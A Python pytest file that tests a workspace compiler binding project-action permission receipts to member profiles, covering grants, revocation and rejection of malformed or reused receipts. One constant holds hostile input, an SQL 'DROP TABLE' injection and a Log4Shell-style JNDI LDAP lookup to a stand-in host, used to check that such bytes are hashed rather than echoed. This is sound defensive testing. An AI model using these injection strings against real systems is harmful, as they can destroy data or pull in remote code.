"""Dormant project action enrollment compile tests in the sealed Workspace owner.

Focused pytest over the pure compiler only: synthetic principals/receipts, no
issuer, enrollment, file, install or action. Joins the actual parent fixtures.
"""
import copy
import hashlib
import json

import pytest

from ops.executive_os import workspace_project_action_enrollment as enrollment
from integrations.mastermind_workspace_app import project_authoring_grant as project_grant
from ops.executive_os.workspace_owner_enrollment import (
    _MAX_RECEIPT_BYTES,
    WorkspaceOwnerCompilerError,
)
from tests.test_workspace_control_room_action_grants import compile_source
from tests.test_workspace_member_bindings import fixture, principal

V4 = "mastermind.workspace_acquisition_bindings.v4"
PUBLISH = "publish_project_proposal"
PROJECT_ACTIONS = (
    PUBLISH,
    "pause_workstream_admission",
    "resume_workstream_admission",
    "ADOPT_PLAN",
    "ACCEPT_DIRECTION",
    "add_project_file",
    "set_project_communication_preference",
    "pause_instruction_admission",
)
FIELDS = project_grant._ACTION_FIELDS
SCOPED_FIELDS = tuple(FIELDS[action] for action in PROJECT_ACTIONS[1:])
CONTROL_ROOM = ("discover", "open", "bind", "unbind", "refresh-builds")
WORK_REF = "WS:P16-T1-S7"
_HOSTILE = b"'; DROP TABLE profiles;--\n\x00\xff\\${jndi:ldap://expired.example}"


def _granted(profile, actions=PROJECT_ACTIONS):
    return {(profile, action) for action in actions}


def project_receipts(profiles, selected=(), work_ref=WORK_REF):
    """Complete explicit receipt maps: exactly the closed eight-action keys."""
    chosen = set(selected)
    return {
        name: {action: (
            {"work_ref": work_ref, "instruction_ref": "INS:WEEKLY-UPDATE", "receipt": f"scoped:{name}:{action}".encode()}
            if action == "pause_instruction_admission" and (name, action) in chosen
            else {"work_ref": work_ref, "receipt": f"scoped:{name}:{action}".encode()}
            if action != PUBLISH and (name, action) in chosen
            else (f"publish:{name}".encode()
                  if action == PUBLISH and (name, action) in chosen else None)
        ) for action in PROJECT_ACTIONS}
        for name in profiles
    }


def expected_grant(receipt):
    """Expected stored grant for one supplied receipt input."""
    if isinstance(receipt, dict):
        return {"work_ref": receipt["work_ref"],
                "permission_digest": hashlib.sha256(receipt["receipt"]).hexdigest()} | ({"instruction_ref": receipt["instruction_ref"]} if "instruction_ref" in receipt else {})
    return hashlib.sha256(receipt).hexdigest()


def test_compile_grants_the_five_project_actions_independently():
    policy, source, _values, v3 = compile_source()
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    result = enrollment.compile_project_action_bindings(policy, v3, receipts)
    assert result["schema"] == V4
    assert result["primary_profile"] == v3["primary_profile"]
    assert principal(result) == principal(v3)
    slot = result["profiles"]["member-0"]
    assert slot["enabled"] is True
    assert slot["binding"] == v3["profiles"]["member-0"]["binding"]
    assert slot["control_room_actions"] == v3["profiles"]["member-0"]["control_room_actions"]
    assert slot[FIELDS[PUBLISH]] == expected_grant(receipts["member-0"][PUBLISH])
    for action in PROJECT_ACTIONS[1:]:
        assert slot[FIELDS[action]] == expected_grant(receipts["member-0"][action])
    digests = {slot[FIELDS[PUBLISH]], *(slot[f]["permission_digest"] for f in SCOPED_FIELDS)}
    assert len(digests) == len(PROJECT_ACTIONS)
    assert slot[FIELDS[PUBLISH]] not in slot["control_room_actions"].values()
    denied = result["profiles"]["member-1"]
    assert set(denied) == set(slot)
    assert all(denied[FIELDS[action]] is None for action in PROJECT_ACTIONS)
    assert project_grant.validate_project_bindings(result, policy) == result
    assert project_grant.legacy_workspace_document(result, policy) == v3


def test_compile_preserves_inputs_and_returns_detached_bytes():
    policy, source, _values, v3 = compile_source()
    before = copy.deepcopy(v3)
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    receipts["member-0"][PUBLISH] = bytearray(b"publish:member-0")
    result = enrollment.compile_project_action_bindings(policy, v3, receipts)
    assert result["profiles"]["member-0"][FIELDS[PUBLISH]] == hashlib.sha256(
        b"publish:member-0").hexdigest()
    result["profiles"]["member-0"][FIELDS[PUBLISH]] = "f" * 64
    receipts["member-0"][PUBLISH][:] = b"rotated"
    assert v3 == before
    rotated = enrollment.compile_project_action_bindings(policy, v3, receipts)
    assert rotated["profiles"]["member-0"][FIELDS[PUBLISH]] == hashlib.sha256(
        b"rotated").hexdigest()
    for action in PROJECT_ACTIONS[1:]:
        assert rotated["profiles"]["member-0"][FIELDS[action]] == expected_grant(
            receipts["member-0"][action])


@pytest.mark.parametrize("schema", ["v1", "v2"])
def test_legacy_membership_enters_through_all_null_control_room_maps(schema):
    policy, source = fixture(2)
    if schema == "v1":
        legacy = {"schema": "mastermind.workspace_acquisition_bindings.v1", "profiles": {
            "web": source["profiles"]["member-0"],
            "mac": {"enabled": False, "binding": None},
        }}
        member, other, primary = "web", "mac", None
    else:
        legacy, member, other, primary = source, "member-0", "member-1", "member-0"
    before = copy.deepcopy(legacy)
    receipts = project_receipts(legacy["profiles"], _granted(member))
    result = enrollment.compile_project_action_bindings(policy, legacy, receipts)
    assert legacy == before
    assert result["schema"] == V4
    assert result["primary_profile"] == primary
    slot = result["profiles"][member]
    assert slot["control_room_actions"] == dict.fromkeys(CONTROL_ROOM)
    assert slot[FIELDS[PUBLISH]] == expected_grant(receipts[member][PUBLISH])
    for action in PROJECT_ACTIONS[1:]:
        assert slot[FIELDS[action]] == expected_grant(receipts[member][action])
    quiet = result["profiles"][other]
    assert quiet["control_room_actions"] == dict.fromkeys(CONTROL_ROOM)
    assert all(quiet[FIELDS[action]] is None for action in PROJECT_ACTIONS)


def test_explicit_null_receipts_revoke_and_replace_without_implicit_retention():
    policy, source, _values, v3 = compile_source()
    first = enrollment.compile_project_action_bindings(
        policy, v3, project_receipts(source["profiles"], _granted("member-0")))
    revoked = enrollment.compile_project_action_bindings(
        policy, first, project_receipts(first["profiles"]))
    assert all(revoked["profiles"][name][FIELDS[action]] is None
               for name in revoked["profiles"] for action in PROJECT_ACTIONS)
    assert revoked["profiles"]["member-0"]["binding"] == v3["profiles"]["member-0"]["binding"]
    assert revoked["profiles"]["member-0"]["control_room_actions"] == \
        v3["profiles"]["member-0"]["control_room_actions"]
    partial = project_receipts(first["profiles"], {("member-0", "ADOPT_PLAN")})
    partial["member-0"]["ADOPT_PLAN"] = {"work_ref": "WS:P16-T9", "receipt": b"adopt:member-0"}
    rotated = enrollment.compile_project_action_bindings(policy, first, partial)
    assert rotated["profiles"]["member-0"][FIELDS["ADOPT_PLAN"]] == {
        "work_ref": "WS:P16-T9",
        "permission_digest": hashlib.sha256(b"adopt:member-0").hexdigest(),
    }
    for action in PROJECT_ACTIONS:
        if action != "ADOPT_PLAN":
            assert rotated["profiles"]["member-0"][FIELDS[action]] is None


@pytest.mark.parametrize("bad", ["receipts_type", "missing_profile", "extra_profile",
                                 "missing_action", "unknown_action", "not_mapping"])
def test_compile_requires_the_exact_complete_profile_and_action_maps(bad):
    policy, source, _values, v3 = compile_source()
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    if bad == "receipts_type":
        receipts = ["member-0"]
    if bad == "missing_profile":
        del receipts["member-1"]
    if bad == "extra_profile":
        receipts["member-9"] = dict.fromkeys(PROJECT_ACTIONS)
    if bad == "missing_action":
        del receipts["member-0"]["ADOPT_PLAN"]
    if bad == "unknown_action":
        receipts["member-0"]["PUBLISH_EVERYTHING"] = None
    if bad == "not_mapping":
        receipts["member-0"] = None
    with pytest.raises(WorkspaceOwnerCompilerError):
        enrollment.compile_project_action_bindings(policy, v3, receipts)


@pytest.mark.parametrize("bad", ["empty", "oversized", "text", "scoped_not_mapping",
                                 "scoped_empty", "scoped_oversized", "scoped_text",
                                 "scoped_missing_work_ref", "scoped_extra_key",
                                 "scoped_bad_work_ref", "scoped_work_ref_type"])
def test_compile_rejects_unbounded_or_malformed_receipts(bad):
    policy, source, _values, v3 = compile_source()
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    selected = receipts["member-0"]
    if bad == "empty":
        selected[PUBLISH] = b""
    if bad == "oversized":
        selected[PUBLISH] = b"x" * (_MAX_RECEIPT_BYTES + 1)
    if bad == "text":
        selected[PUBLISH] = "digest-is-not-receipt-bytes"
    if bad == "scoped_not_mapping":
        selected["pause_workstream_admission"] = [WORK_REF]
    if bad == "scoped_empty":
        selected["pause_workstream_admission"]["receipt"] = b""
    if bad == "scoped_oversized":
        selected["pause_workstream_admission"]["receipt"] = b"x" * (_MAX_RECEIPT_BYTES + 1)
    if bad == "scoped_text":
        selected["pause_workstream_admission"]["receipt"] = "text"
    if bad == "scoped_missing_work_ref":
        selected["pause_workstream_admission"] = {"receipt": b"x"}
    if bad == "scoped_extra_key":
        selected["pause_workstream_admission"] = {
            "work_ref": WORK_REF, "receipt": b"x", "role": "admin"}
    if bad == "scoped_bad_work_ref":
        selected["pause_workstream_admission"] = {"work_ref": "not-a-workstream", "receipt": b"x"}
    if bad == "scoped_work_ref_type":
        selected["pause_workstream_admission"] = {"work_ref": 16, "receipt": b"x"}
    with pytest.raises(WorkspaceOwnerCompilerError):
        enrollment.compile_project_action_bindings(policy, v3, receipts)


@pytest.mark.parametrize("mutation", ["disabled", "null_binding"])
def test_disabled_or_unbound_profile_cannot_carry_a_project_action(mutation):
    policy, source, _values, v3 = compile_source()
    if mutation == "disabled":
        v3["profiles"]["member-0"]["enabled"] = False
    else:
        v3["profiles"]["member-0"]["binding"] = None
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    with pytest.raises(WorkspaceOwnerCompilerError):
        enrollment.compile_project_action_bindings(policy, v3, receipts)


@pytest.mark.parametrize("reuse", ["read", "control_room", "sibling_project"])
def test_compile_rejects_read_control_room_and_sibling_project_receipt_reuse(reuse):
    policy, source, _values, v3 = compile_source(("discover",))
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    if reuse == "read":
        receipts["member-0"][PUBLISH] = b"enrollment-0"
    elif reuse == "control_room":
        receipts["member-0"][PUBLISH] = b"fixture-action-receipt:member-0:discover"
    else:
        receipts["member-0"]["ADOPT_PLAN"]["receipt"] = b"publish:member-0"
    with pytest.raises(WorkspaceOwnerCompilerError):
        enrollment.compile_project_action_bindings(policy, v3, receipts)


def test_hostile_receipt_bytes_are_hashed_and_never_echoed():
    policy, source, _values, v3 = compile_source()
    receipts = project_receipts(source["profiles"], _granted("member-0"))
    receipts["member-0"][PUBLISH] = _HOSTILE
    result = enrollment.compile_project_action_bindings(policy, v3, receipts)
    assert result["profiles"]["member-0"][FIELDS[PUBLISH]] == hashlib.sha256(_HOSTILE).hexdigest()
    assert "\\" not in json.dumps(result)
    receipts["member-0"]["pause_workstream_admission"] = {
        "work_ref": WORK_REF, "receipt": _HOSTILE + b"x" * _MAX_RECEIPT_BYTES}
    with pytest.raises(WorkspaceOwnerCompilerError) as refused:
        enrollment.compile_project_action_bindings(policy, v3, receipts)
    assert "DROP TABLE" not in str(refused.value)
    assert "${jndi" not in str(refused.value)


def test_compile_refuses_foreign_policy_and_malformed_existing_documents():
    policy, source, _values, v3 = compile_source()
    receipts = project_receipts(source["profiles"])
    for bad_policy, bad_bindings in [
        ("policy", v3),
        (None, v3),
        (policy, None),
        (policy, {"schema": V4, "profiles": {}, "primary_profile": None}),
    ]:
        with pytest.raises(WorkspaceOwnerCompilerError):
            enrollment.compile_project_action_bindings(bad_policy, bad_bindings, receipts)
